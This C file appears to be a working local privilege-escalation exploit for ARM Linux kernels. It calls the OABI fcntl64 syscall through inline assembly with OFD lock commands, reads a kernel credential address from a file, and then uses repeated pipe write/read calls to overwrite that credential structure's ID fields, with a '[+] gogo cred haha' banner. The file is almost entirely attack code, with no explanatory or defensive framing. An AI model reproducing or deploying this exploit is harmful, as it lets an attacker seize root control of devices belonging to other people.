#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/ptrace.h>

// gcc -o a a.c libc.s -nostartfiles -nostdlib -static -Os
//
__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
	
	__asm __volatile (
	"swi	0x9000DD\n"
	"mov	pc, lr\n"
	:   
	:
	:
	);
}

#define F_OFD_GETLK	36
#define F_OFD_SETLK	37
#define F_OFD_SETLKW 38


int _start(void)
{

	int fd = open("/proc/cpuinfo", O_RDONLY);
	struct flock *map_base = 0;
	struct flock *map_base2 = 0;

	if(fd == -1){
		write(1, "open error\n", 11);
		return -1;
	}

	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	map_base->l_start = SEEK_SET;

	unsigned int cred = 0;

	int junofd = open("./tmp_cred", O_RDONLY);
	read(junofd, &cred, 4);
	close(junofd);

	if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
		write(1, "fcnt error\n", 11);
		return -1;
	}

	write(1, "[+] gogo cred haha\n", 22);

	int pipefd[2];
	  
	pipe(pipefd);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+4, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+8, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+12, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+16, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+20, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+24, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+28, 4);
	write(pipefd[1], cred+0x30, 4);
	read(pipefd[0], cred+32, 4);
	
	close(pipefd[0]);
	close(pipefd[1]);

	write(1, "\n", 1);
	write(1, "done!\n", 6);

	_exit(0);
}

